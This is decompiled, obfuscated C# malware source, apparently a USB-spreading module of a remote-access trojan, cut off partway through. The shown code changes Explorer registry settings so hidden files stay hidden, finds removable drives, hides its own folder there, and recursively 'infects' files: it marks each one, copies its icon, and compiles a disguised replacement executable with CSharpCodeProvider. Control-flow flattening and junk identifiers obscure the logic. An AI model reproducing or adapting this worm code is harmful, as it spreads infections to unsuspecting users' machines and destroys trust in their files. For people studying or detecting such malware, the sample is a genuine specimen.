using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.IconLib;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using HsZcU78F13T1yLWI1V;
using Microsoft.CSharp;
using Microsoft.Win32;
using UY3BiEArlp6B4GPt9k;

namespace Miscellaneous.Handler;

internal class HandleLimeUSB
{
	internal static object MPtDc3XI2iESZh1gvqi;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Initialize()
	{
		int num = 6;
		int num2 = num;
		int num3 = default(int);
		DriveInfo[] array = default(DriveInfo[]);
		DriveInfo driveInfo = default(DriveInfo);
		int num5 = default(int);
		int num7 = default(int);
		while (true)
		{
			switch (num2)
			{
			default:
				return;
			case 7:
			case 9:
				if (num3 < array.Length)
				{
					num2 = 8;
					if (lBVmk8X3benwvuVUPcq() == null)
					{
						num2 = 8;
					}
					break;
				}
				return;
			case 1:
				num3++;
				num2 = 9;
				break;
			case 0:
				return;
			case 3:
				try
				{
					if (XKt795X0Hs2dRJUeYQw(driveInfo, Lcp2oC5pw53um0535Bu.NUr5YeNSna) == DriveType.Removable)
					{
						int num4 = 12;
						while (true)
						{
							switch (num4)
							{
							default:
								goto end_IL_00b5;
							case 0:
								goto end_IL_00b5;
							case 12:
								if (!usYj67JBV1NBBsby7v.cnL5MhNQE(driveInfo, usYj67JBV1NBBsby7v.AMJ5OE01r7))
								{
									num4 = 0;
									if (lBVmk8X3benwvuVUPcq() == null)
									{
										continue;
									}
									goto IL_00b1;
								}
								goto case 6;
							case 13:
								if (E7o3SJXm6Zxwffn1EMI(PQWH90X2M68NPtSLLwR(M5cbfeXA0tmW2U5v77y(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, L6ynYbXCdO3oeny4aof(1548), Settings.IconsDirectory, Pa19DA5emMEm180Fuj9.G5p53xDIT7), X3UIGg5rTOhhdeWri5I.Khj5KFvQfI))
								{
									num4 = 2;
									continue;
								}
								break;
							case 6:
								if (!X3UIGg5rTOhhdeWri5I.cnL5MhNQE((string)DZkbX8XQCLYd5oxN4LZ(zVYIKQMSYiXDLtRkIF.cnL5MhNQE(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, BE8yW85SsYafw4VLBln.Bgj5nEXQpo), X3UIGg5rTOhhdeWri5I.Khj5KFvQfI))
								{
									num4 = 10;
									continue;
								}
								goto case 13;
							case 9:
								BDFCGaq9v42MWr7xLOL.cnL5MhNQE((string)rR95N1XcTraX9dYLJu6(VKa9WC5fXpJA06Yanbt.Q8A5zpXSpm), (string)PQWH90X2M68NPtSLLwR(M5cbfeXA0tmW2U5v77y(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, L6ynYbXCdO3oeny4aof(1548), Settings.LimeUSBFile, Pa19DA5emMEm180Fuj9.G5p53xDIT7), BDFCGaq9v42MWr7xLOL.JUXq5m4k27);
								num4 = 3;
								if (dt5xbgXajC617ZoAdAR())
								{
									num4 = 5;
								}
								continue;
							case 8:
								InfectFiles(zVYIKQMSYiXDLtRkIF.cnL5MhNQE(wYq9rk5lScGXZlkpm4m.cnL5MhNQE(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY));
								num4 = 1;
								if (dt5xbgXajC617ZoAdAR())
								{
									continue;
								}
								goto IL_00b1;
							case 4:
								qffk30XxaZjWsBWbVTG(DZkbX8XQCLYd5oxN4LZ(M5cbfeXA0tmW2U5v77y(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, BE8yW85SsYafw4VLBln.Bgj5nEXQpo), FileAttributes.Hidden | FileAttributes.System, IA3kZO5E610FAM0NSuG.Oxk5FXsAWB);
								num4 = 13;
								continue;
							case 3:
							case 5:
								CreteDirectory(zVYIKQMSYiXDLtRkIF.cnL5MhNQE(wYq9rk5lScGXZlkpm4m.cnL5MhNQE(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY));
								num4 = 8;
								if (lBVmk8X3benwvuVUPcq() == null)
								{
									continue;
								}
								goto IL_00b1;
							case 10:
								JeLQMwXZZAJEL1UbJHQ(DZkbX8XQCLYd5oxN4LZ(M5cbfeXA0tmW2U5v77y(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, BE8yW85SsYafw4VLBln.Bgj5nEXQpo), BOSgR751mlmbtrGDM6H.fMN5dO4cKG);
								num4 = 4;
								if (lBVmk8X3benwvuVUPcq() == null)
								{
									continue;
								}
								goto IL_00b1;
							case 7:
								break;
							case 2:
							case 11:
								if (E7o3SJXm6Zxwffn1EMI(Pa19DA5emMEm180Fuj9.cnL5MhNQE((string)M5cbfeXA0tmW2U5v77y(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1548), Settings.LimeUSBFile, Pa19DA5emMEm180Fuj9.G5p53xDIT7), X3UIGg5rTOhhdeWri5I.b0Z5Awjfvb))
								{
									num4 = 3;
									if (dt5xbgXajC617ZoAdAR())
									{
										continue;
									}
									goto IL_00b1;
								}
								goto case 9;
							case 1:
								goto end_IL_00b5;
								IL_00b1:
								num4 = num5;
								continue;
							}
							JeLQMwXZZAJEL1UbJHQ(Pa19DA5emMEm180Fuj9.cnL5MhNQE((string)M5cbfeXA0tmW2U5v77y(w2dW60XqZaMBcyFsCyT(driveInfo, wYq9rk5lScGXZlkpm4m.B475hVeln9), zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), Settings.WorkDirectory, (string)L6ynYbXCdO3oeny4aof(1548), Settings.IconsDirectory, Pa19DA5emMEm180Fuj9.G5p53xDIT7), BOSgR751mlmbtrGDM6H.fMN5dO4cKG);
							num4 = 11;
							continue;
							end_IL_00b5:
							break;
						}
					}
				}
				catch (Exception)
				{
					int num6 = 0;
					if (lBVmk8X3benwvuVUPcq() != null)
					{
						num6 = num7;
					}
					switch (num6)
					{
					case 0:
						break;
					}
				}
				goto case 1;
			case 5:
				array = (DriveInfo[])LUFFVoX9SUkuwXMKONZ(EdionC5cPTLQcVUePeO.cM15V54636);
				num2 = 2;
				if (lBVmk8X3benwvuVUPcq() != null)
				{
					num2 = 0;
				}
				break;
			case 4:
			case 8:
				driveInfo = array[num3];
				num2 = 3;
				break;
			case 2:
				num3 = 0;
				num2 = 7;
				break;
			case 6:
				ExplorerOptions();
				num2 = 5;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ExplorerOptions()
	{
		switch (1)
		{
		case 1:
			try
			{
				RegistryKey registryKey = (RegistryKey)iZkqhMXeGCBIfmhTjoK(Registry.CurrentUser, L6ynYbXCdO3oeny4aof(1554), true, qCqWZ35LZklYkq8nN1O.QwP5v1N1yW);
				int num = 3;
				int num2 = default(int);
				while (true)
				{
					switch (num)
					{
					case 3:
						if (dnqN9HXpWoiN7mlBmuI(registryKey, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1676), BSeITd6G2VhHn3drr4.kpl5m4plpZ) != (object)2)
						{
							num = 0;
							if (dt5xbgXajC617ZoAdAR())
							{
								break;
							}
							goto IL_004b;
						}
						goto case 2;
					case 2:
						if (dnqN9HXpWoiN7mlBmuI(registryKey, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1692), BSeITd6G2VhHn3drr4.kpl5m4plpZ) != (object)1)
						{
							num = 4;
							break;
						}
						return;
					case 4:
						QvUR3eqq5QgrcVLmZ0n.cnL5MhNQE(registryKey, (string)L6ynYbXCdO3oeny4aof(1692), 1, QvUR3eqq5QgrcVLmZ0n.LMBqSRqPF4);
						num = 1;
						if (dt5xbgXajC617ZoAdAR())
						{
							break;
						}
						goto IL_004b;
					default:
						reVFD8XK8wXcxSDW08p(registryKey, L6ynYbXCdO3oeny4aof(1676), 2, QvUR3eqq5QgrcVLmZ0n.LMBqSRqPF4);
						num = 2;
						break;
					case 1:
						return;
						IL_004b:
						num = num2;
						break;
					}
				}
			}
			catch (Exception)
			{
				int num3 = 0;
				if (lBVmk8X3benwvuVUPcq() != null)
				{
					num3 = 0;
				}
				switch (num3)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void InfectFiles(string path)
	{
		int num = 15;
		string text2 = default(string);
		int num5 = default(int);
		int num7 = default(int);
		string text = default(string);
		string[] array = default(string[]);
		int num3 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 12:
					try
					{
						int num4;
						if (!CheckIfInfected(text2))
						{
							num4 = 1;
							if (lBVmk8X3benwvuVUPcq() != null)
							{
								num4 = 1;
							}
							goto IL_0094;
						}
						goto IL_0130;
						IL_0090:
						num4 = num5;
						goto IL_0094;
						IL_0130:
						ChangeIcon(text2);
						num4 = 4;
						if (lBVmk8X3benwvuVUPcq() != null)
						{
							goto IL_0090;
						}
						goto IL_0094;
						IL_0094:
						while (true)
						{
							switch (num4)
							{
							case 4:
								break;
							case 3:
								goto IL_00f9;
							case 1:
								goto end_IL_0094;
							default:
								goto IL_0130;
							case 2:
								goto end_IL_0094;
							}
							K3LOg9XNr7cVLcTlals(text2, TGXaTPXLJehGomthqnA(text2, 3, DZkbX8XQCLYd5oxN4LZ(Settings.WorkDirectory, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1548), BE8yW85SsYafw4VLBln.Bgj5nEXQpo), UUJEmUqv357GgI44IgQ.p2Aq8UwnFZ), BDFCGaq9v42MWr7xLOL.nbmqHbFtUQ);
							num4 = 3;
							if (lBVmk8X3benwvuVUPcq() == null)
							{
								continue;
							}
							goto IL_0090;
							IL_00f9:
							CompileFile(text2);
							num4 = 2;
							if (lBVmk8X3benwvuVUPcq() == null)
							{
								continue;
							}
							goto IL_0090;
							continue;
							end_IL_0094:
							break;
						}
					}
					catch (Exception)
					{
						int num6 = 0;
						if (lBVmk8X3benwvuVUPcq() != null)
						{
							num6 = num7;
						}
						switch (num6)
						{
						case 0:
							break;
						}
					}
					goto case 13;
				case 16:
					InfectFiles(text);
					num2 = 8;
					continue;
				case 2:
				case 7:
					text = array[num3];
					num2 = 9;
					if (lBVmk8X3benwvuVUPcq() == null)
					{
						continue;
					}
					break;
				case 6:
				case 10:
					if (num3 < array.Length)
					{
						num2 = 2;
						continue;
					}
					return;
				default:
					if (num3 < array.Length)
					{
						num2 = 5;
						continue;
					}
					goto case 4;
				case 8:
				case 17:
					num3++;
					num2 = 10;
					continue;
				case 14:
					num3 = 0;
					num2 = 3;
					continue;
				case 13:
					num3++;
					num2 = 0;
					if (dt5xbgXajC617ZoAdAR())
					{
						continue;
					}
					break;
				case 5:
				case 18:
					text2 = array[num3];
					num = 12;
					break;
				case 4:
					array = fi3QseqWmBJrh1dSruv.cnL5MhNQE(path, fi3QseqWmBJrh1dSruv.b1Rqm9MUZn);
					num = 11;
					break;
				case 1:
					return;
				case 15:
					array = (string[])DQnCBaXkHTWup0Vu5f6(path, fi3QseqWmBJrh1dSruv.VFCqLZHPok);
					num2 = 14;
					continue;
				case 9:
					if (FJmXE0Xikx7scZNjPKV(text, Settings.WorkDirectory, j1cHUe598IDHpZ30AxZ.Xl45qWrHxg))
					{
						num2 = 17;
						if (lBVmk8X3benwvuVUPcq() == null)
						{
							continue;
						}
						break;
					}
					goto case 16;
				case 11:
					num3 = 0;
					num2 = 6;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void CreteDirectory(string usbDirectory)
	{
		int num = 7;
		int num2 = num;
		string text = default(string);
		int num5 = default(int);
		int num7 = default(int);
		string[] array = default(string[]);
		int num3 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 5:
				try
				{
					int num4;
					if (j1cHUe598IDHpZ30AxZ.cnL5MhNQE(text, Settings.WorkDirectory, j1cHUe598IDHpZ30AxZ.Xl45qWrHxg))
					{
						num4 = 4;
						if (!dt5xbgXajC617ZoAdAR())
						{
							num4 = 2;
						}
						goto IL_0075;
					}
					goto IL_011a;
					IL_00b2:
					CreteDirectory(text);
					num4 = 0;
					if (lBVmk8X3benwvuVUPcq() != null)
					{
						goto IL_0071;
					}
					goto IL_0075;
					IL_0071:
					num4 = num5;
					goto IL_0075;
					IL_0075:
					while (true)
					{
						switch (num4)
						{
						case 4:
							break;
						case 3:
							goto IL_00b2;
						case 2:
							JeLQMwXZZAJEL1UbJHQ(TGXaTPXLJehGomthqnA(text, 3, BE8yW85SsYafw4VLBln.cnL5MhNQE(Settings.WorkDirectory, (string)L6ynYbXCdO3oeny4aof(1548), BE8yW85SsYafw4VLBln.Bgj5nEXQpo), UUJEmUqv357GgI44IgQ.p2Aq8UwnFZ), BOSgR751mlmbtrGDM6H.fMN5dO4cKG);
							num4 = 0;
							if (dt5xbgXajC617ZoAdAR())
							{
								num4 = 3;
							}
							continue;
						case 1:
							goto IL_011a;
						case 0:
							break;
						}
						break;
					}
					goto end_IL_0041;
					IL_011a:
					if (!X3UIGg5rTOhhdeWri5I.cnL5MhNQE((string)TGXaTPXLJehGomthqnA(text, 3, DZkbX8XQCLYd5oxN4LZ(Settings.WorkDirectory, L6ynYbXCdO3oeny4aof(1548), BE8yW85SsYafw4VLBln.Bgj5nEXQpo), UUJEmUqv357GgI44IgQ.p2Aq8UwnFZ), X3UIGg5rTOhhdeWri5I.Khj5KFvQfI))
					{
						num4 = 2;
						if (lBVmk8X3benwvuVUPcq() != null)
						{
							goto IL_0071;
						}
						goto IL_0075;
					}
					goto IL_00b2;
					end_IL_0041:;
				}
				catch (Exception)
				{
					int num6 = 0;
					if (lBVmk8X3benwvuVUPcq() != null)
					{
						num6 = num7;
					}
					switch (num6)
					{
					case 0:
						break;
					}
				}
				goto case 1;
			case 7:
				array = fi3QseqWmBJrh1dSruv.cnL5MhNQE(usbDirectory, fi3QseqWmBJrh1dSruv.b1Rqm9MUZn);
				num2 = 6;
				break;
			default:
				if (num3 < array.Length)
				{
					num2 = 8;
					break;
				}
				return;
			case 6:
				num3 = 0;
				num2 = 0;
				if (dt5xbgXajC617ZoAdAR())
				{
					num2 = 0;
				}
				break;
			case 1:
				num3++;
				num2 = 3;
				if (lBVmk8X3benwvuVUPcq() == null)
				{
					num2 = 3;
				}
				break;
			case 2:
			case 8:
				text = array[num3];
				num2 = 5;
				break;
			case 4:
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool CheckIfInfected(string file)
	{
		bool result = default(bool);
		switch (1)
		{
		case 1:
			try
			{
				int num;
				if (!RbXy5yvn4JjKpY18qt.cnL5MhNQE((string)M5cbfeXA0tmW2U5v77y(bsHQJfXJeg2R2QId5Va(file, EPBeEFqxYLGb2vBbwVv.EwKqZfhiAD), zVYIKQMSYiXDLtRkIF.pISqgdmsZd), Settings.InfectedTrademark, RbXy5yvn4JjKpY18qt.W8K8WSOGF))
				{
					num = 0;
					if (lBVmk8X3benwvuVUPcq() != null)
					{
						int num2 = default(int);
						num = num2;
					}
					goto IL_0067;
				}
				goto IL_00b3;
				IL_0067:
				while (true)
				{
					switch (num)
					{
					case 2:
						goto end_IL_0067;
					case 4:
						break;
					default:
						goto IL_00c0;
					case 3:
						goto end_IL_0067;
					}
					goto IL_00b3;
					IL_00c0:
					result = true;
					num = 3;
					continue;
					end_IL_0067:
					break;
				}
				goto end_IL_0025;
				IL_00b3:
				result = false;
				num = 2;
				goto IL_0067;
				end_IL_0025:;
			}
			catch
			{
				int num3 = 0;
				if (lBVmk8X3benwvuVUPcq() != null)
				{
					int num4 = default(int);
					num3 = num4;
				}
				while (true)
				{
					switch (num3)
					{
					default:
						result = false;
						num3 = 0;
						if (lBVmk8X3benwvuVUPcq() == null)
						{
							num3 = 1;
						}
						continue;
					case 1:
						break;
					}
					break;
				}
			}
			break;
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void ChangeIcon(string file)
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				Icon icon = (Icon)OqudLvXWd16ohG9HaUw(file, A90dZoqT6PpBSaG2Kl3.lsRqo3GUWL);
				int num = 0;
				if (!dt5xbgXajC617ZoAdAR())
				{
					goto IL_0048;
				}
				goto IL_004c;
				IL_0048:
				int num2 = default(int);
				num = num2;
				goto IL_004c;
				IL_004c:
				do
				{
					switch (num)
					{
					case 1:
						return;
					}
					object obj = uTxn60Xo8Q0eprITwsW(new MultiIcon(), FdLf2aXY9MBbLBkmUUA(file, zpKhQyqQJOnIHE3iWlJ.JvGqGiBhvQ));
					B5CtuUXwEqubDwT3Oty(obj, MG40SgXliJdO6sHktwP(icon, CCaYl6qsPUYvl7icKNR.G2tqt7NMQI), IconOutputFormat.Vista);
					((SingleIcon)obj).Save(N5OMWJ57yIY7I87W4sj.cnL5MhNQE(new string[7]
					{
						(string)FdLf2aXY9MBbLBkmUUA(file, zpKhQyqQJOnIHE3iWlJ.Em2qbYC492),
						Settings.WorkDirectory,
						(string)L6ynYbXCdO3oeny4aof(1548),
						Settings.IconsDirectory,
						(string)L6ynYbXCdO3oeny4aof(1548),
						(string)FdLf2aXY9MBbLBkmUUA(kZM2SCX4QEwnHpGLc7f(file, L6ynYbXCdO3oeny4aof(1718), null, aeWitjq4jvkDyot6w1o.x7YqyStpNQ), zpKhQyqQJOnIHE3iWlJ.IBhquwnvQH),
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1724)
					}, N5OMWJ57yIY7I87W4sj.QyK5NKThfc));
					num = 1;
				}
				while (lBVmk8X3benwvuVUPcq() == null);
				goto IL_0048;
			}
			catch (Exception)
			{
				int num3 = 0;
				if (lBVmk8X3benwvuVUPcq() != null)
				{
					int num4 = default(int);
					num3 = num4;
				}
				switch (num3)
				{
				case 0:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void CompileFile(string infectedFile)
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				string text = (string)nq519IXvWGLpc6bGikk(Oecv9QXhb06tyPqXEKf(klIUUc5aP9EiE6qr3Ps.Xie52j2ypr), pE6W65XuNJfOYW5F0Ko(L6ynYbXCdO3oeny4aof(1736), LEkKTBqRsxxwccSK95w.tfZqjqZfP1), SPOX9CqPMQvbD2VN0DC.k9XqIJCj65);
				int num = 4;
				string text2 = default(string);
				CSharpCodeProvider cSharpCodeProvider = default(CSharpCodeProvider);
				Dictionary<string, string> providerOptions = default(Dictionary<string, string>);
				string[] assemblyNames = default(string[]);
				int num4 = default(int);
				int num6 = default(int);
				while (true)
				{
					int num2 = num;
					while (true)
					{
						switch (num2)
						{
						case 12:
							return;
						default:
							text2 = (string)L6ynYbXCdO3oeny4aof(3108);
							num2 = 10;
							if (!dt5xbgXajC617ZoAdAR())
							{
								num2 = 4;
							}
							continue;
						case 6:
							cSharpCodeProvider = new CSharpCodeProvider(providerOptions);
							num2 = 11;
							if (dt5xbgXajC617ZoAdAR())
							{
								continue;
							}
							break;
						case 9:
							text = (string)kZM2SCX4QEwnHpGLc7f(text, L6ynYbXCdO3oeny4aof(3068), rP0YIHXFMoVfoTFwLy7(uKgSv5qkP2t8LGxlQMX.F5HqCNr8M8).ToString(), aeWitjq4jvkDyot6w1o.x7YqyStpNQ);
							num2 = 8;
							continue;
						case 10:
							if (E7o3SJXm6Zxwffn1EMI(N5OMWJ57yIY7I87W4sj.cnL5MhNQE(new string[7]
							{
								(string)FdLf2aXY9MBbLBkmUUA(infectedFile, zpKhQyqQJOnIHE3iWlJ.Em2qbYC492),
								Settings.WorkDirectory,
								nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1548),
								Settings.IconsDirectory,
								(string)L6ynYbXCdO3oeny4aof(1548),
								zpKhQyqQJOnIHE3iWlJ.cnL5MhNQE((string)kZM2SCX4QEwnHpGLc7f(infectedFile, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1718), null, aeWitjq4jvkDyot6w1o.x7YqyStpNQ), zpKhQyqQJOnIHE3iWlJ.IBhquwnvQH),
								(string)L6ynYbXCdO3oeny4aof(1724)
							}, N5OMWJ57yIY7I87W4sj.QyK5NKThfc), X3UIGg5rTOhhdeWri5I.b0Z5Awjfvb))
							{
								num2 = 7;
								if (dt5xbgXajC617ZoAdAR())
								{
									continue;
								}
								break;
							}
							goto case 6;
						case 11:
							try
							{
								CompilerParameters compilerParameters = new CompilerParameters(assemblyNames);
								LW1iF1X8XysFvqoab20(compilerParameters, true, IFtgihx0iA5oNXHUy6.LjkZ2foiU);
								iQhHJkXOOVsCbGqD445(compilerParameters, DZkbX8XQCLYd5oxN4LZ(infectedFile, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3240), BE8yW85SsYafw4VLBln.Bgj5nEXQpo), kdcg46TA0IYwy3FDnZ.Um7qDMD9SJ);
								iQhHJkXOOVsCbGqD445(compilerParameters, text2, kdcg46TA0IYwy3FDnZ.omAoNH7g2);
								LW1iF1X8XysFvqoab20(compilerParameters, false, IFtgihx0iA5oNXHUy6.u8rQPJTLa);
								LW1iF1X8XysFvqoab20(compilerParameters, false, IFtgihx0iA5oNXHUy6.KZ8GX4tYW);
								CompilerParameters compilerParameters2 = compilerParameters;
								int num3 = 1;
								if (lBVmk8X3benwvuVUPcq() != null)
								{
									goto IL_022b;
								}
								goto IL_022f;
								IL_022b:
								num3 = num4;
								goto IL_022f;
								IL_022f:
								do
								{
									switch (num3)
									{
									default:
										return;
									case 0:
										return;
									case 1:
										break;
									}
									RoOoSNX1EF6s7Mx4dnq(cSharpCodeProvider, compilerParameters2, new string[1] { text }, hTXMI1sWbxsTmNqsCT.clMt4N5nR);
									num3 = 0;
								}
								while (lBVmk8X3benwvuVUPcq() == null);
								goto IL_022b;
							}
							finally
							{
								int num5;
								if (cSharpCodeProvider == null)
								{
									num5 = 1;
									if (!dt5xbgXajC617ZoAdAR())
									{
										num5 = 0;
									}
									goto IL_029a;
								}
								goto IL_02bf;
								IL_029a:
								switch (num5)
								{
								default:
									goto end_IL_0275;
								case 1:
									goto end_IL_0275;
								case 2:
									break;
								case 0:
									goto end_IL_0275;
								}
								goto IL_02bf;
								IL_02bf:
								xoRAhX7vZnAU6ouQJf.cnL5MhNQE(cSharpCodeProvider, xoRAhX7vZnAU6ouQJf.rBhN0MfTk);
								num5 = 0;
								if (!dt5xbgXajC617ZoAdAR())
								{
									num5 = num6;
								}
								goto IL_029a;
								end_IL_0275:;
							}
						case 7:
							text2 = (string)YTYyCWXbtXi5dH49JnT(new string[9]
							{
								text2,
								(string)L6ynYbXCdO3oeny4aof(3196),
								(string)FdLf2aXY9MBbLBkmUUA(infectedFile, zpKhQyqQJOnIHE3iWlJ.Em2qbYC492),
								Settings.WorkDirectory,
								(string)L6ynYbXCdO3oeny4aof(1548),
								Settings.IconsDirectory,
								(string)L6ynYbXCdO3oeny4aof(1548),
								(string)FdLf2aXY9MBbLBkmUUA(kZM2SCX4QEwnHpGLc7f(infectedFile, L6ynYbXCdO3oeny4aof(1718), null, aeWitjq4jvkDyot6w1o.x7YqyStpNQ), zpKhQyqQJOnIHE3iWlJ.IBhquwnvQH),
								nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3226)
							}, N5OMWJ57yIY7I87W4sj.QyK5NKThfc);
							num2 = 6;
							if (lBVmk8X3benwvuVUPcq() != null)
							{
								num2 = 1;
							}
							continue;
						case 2:
							text = (string)kZM2SCX4QEwnHpGLc7f(text, L6ynYbXCdO3oeny4aof(3002), TGXaTPXLJehGomthqnA(infectedFile, 3, DZkbX8XQCLYd5oxN4LZ(Settings.WorkDirectory, L6ynYbXCdO3oeny4aof(1548), BE8yW85SsYafw4VLBln.Bgj5nEXQpo), UUJEmUqv357GgI44IgQ.p2Aq8UwnFZ), aeWitjq4jvkDyot6w1o.x7YqyStpNQ);
							num2 = 1;
							if (lBVmk8X3benwvuVUPcq() != null)
							{
								num2 = 0;
							}
							continue;
						case 4:
							text = (string)kZM2SCX4QEwnHpGLc7f(text, L6ynYbXCdO3oeny4aof(2980), PQWH90X2M68NPtSLLwR(FdLf2aXY9MBbLBkmUUA(infectedFile, zpKhQyqQJOnIHE3iWlJ.Em2qbYC492), Settings.WorkDirectory, L6ynYbXCdO3oeny4aof(1548), Settings.LimeUSBFile, Pa19DA5emMEm180Fuj9.G5p53xDIT7), aeWitjq4jvkDyot6w1o.x7YqyStpNQ);
							num = 2;
							break;
						case 1:
							text = (string)kZM2SCX4QEwnHpGLc7f(text, L6ynYbXCdO3oeny4aof(3018), Settings.InfectedTrademark, aeWitjq4jvkDyot6w1o.x7YqyStpNQ);
							num2 = 3;
							continue;
						case 8:
							assemblyNames = new string[1] { (string)L6ynYbXCdO3oeny4aof(3084) };
							num2 = 5;
							continue;
						case 3:
							text = aeWitjq4jvkDyot6w1o.cnL5MhNQE(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3034), Randomz(GmtwRTXHChnrDAnNPur(new Random(), 6, 12, wixfP1qMtSSFeyH75gu.phhq0mLXdd)), aeWitjq4jvkDyot6w1o.x7YqyStpNQ);
							num2 = 9;
							continue;
						case 5:
							providerOptions = new Dictionary<string, string> { 
							{
								(string)L6ynYbXCdO3oeny4aof(0),
								nCP5vtxT3QjsSeuiK3.xuCtsHmOK(34)
							} };
							num2 = 0;
							if (dt5xbgXajC617ZoAdAR())
							{
								continue;
							}
							break;
						}
						break;
					}
				}
			}
			catch (Exception)
			{
				int num7 = 0;
				if (dt5xbgXajC617ZoAdAR())
				{
					num7 = 0;
				}
				switch (num7)
				{
				case 0:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string Randomz(int L)
	{
		int num = 2;
		StringBuilder stringBuilder = default(StringBuilder);
		string text = default(string);
		char c = default(char);
		int num4 = default(int);
		int num3 = default(int);
		Random random = default(Random);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 1:
					stringBuilder = new StringBuilder();
					num2 = 7;
					continue;
				case 2:
					text = (string)L6ynYbXCdO3oeny4aof(3252);
					num2 = 1;
					if (lBVmk8X3benwvuVUPcq() == null)
					{
						num2 = 1;
					}
					continue;
				case 6:
					c = CyVbwyXEsrtm1bwGQ5p(text, num4, KTav0ZqXmwOhC49o1lv.QPiq73OOjx);
					num2 = 0;
					if (lBVmk8X3benwvuVUPcq() == null)
					{
						continue;
					}
					break;
				case 8:
					num3++;
					num2 = 10;
					continue;
				case 7:
					random = new Random();
					num2 = 4;
					continue;
				case 3:
				case 10:
					if (num3 > L)
					{
						num2 = 5;
						continue;
					}
					goto case 9;
				case 9:
					num4 = GmtwRTXHChnrDAnNPur(random, 0, oX7Qj6yJIobF4eKyjA.cnL5MhNQE(text, oX7Qj6yJIobF4eKyjA.ra0qJKb7IQ), wixfP1qMtSSFeyH75gu.phhq0mLXdd);
					num2 = 6;
					continue;
				default:
					OGlwWuXyel3saubAOJy(stringBuilder, c, FtcWtCqNKqRRAiq3yOX.yM0qaiuD6W);
					num2 = 8;
					if (dt5xbgXajC617ZoAdAR())
					{
						continue;
					}
					break;
				case 4:
					num3 = 1;
					num2 = 3;
					continue;
				case 5:
					return (string)M5cbfeXA0tmW2U5v77y(stringBuilder, zVYIKQMSYiXDLtRkIF.gHC5xh3KTY);
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleLimeUSB()
	{
		WkMgYHbfSUMGdoITRx.Mwxkyt2zf90Xh();
		base._002Ector();
		int num = 0;
		if (0 == 0)
		{
			num = 0;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object LUFFVoX9SUkuwXMKONZ(object P_0)
	{
		return EdionC5cPTLQcVUePeO.cnL5MhNQE((EdionC5cPTLQcVUePeO)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static DriveType XKt795X0Hs2dRJUeYQw(object P_0, object P_1)
	{
		return Lcp2oC5pw53um0535Bu.cnL5MhNQE(P_0, (Lcp2oC5pw53um0535Bu)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object w2dW60XqZaMBcyFsCyT(object P_0, object P_1)
	{
		return wYq9rk5lScGXZlkpm4m.cnL5MhNQE(P_0, (wYq9rk5lScGXZlkpm4m)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object DZkbX8XQCLYd5oxN4LZ(object P_0, object P_1, object P_2)
	{
		return BE8yW85SsYafw4VLBln.cnL5MhNQE((string)P_0, (string)P_1, (BE8yW85SsYafw4VLBln)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object M5cbfeXA0tmW2U5v77y(object P_0, object P_1)
	{
		return zVYIKQMSYiXDLtRkIF.cnL5MhNQE(P_0, (zVYIKQMSYiXDLtRkIF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object JeLQMwXZZAJEL1UbJHQ(object P_0, object P_1)
	{
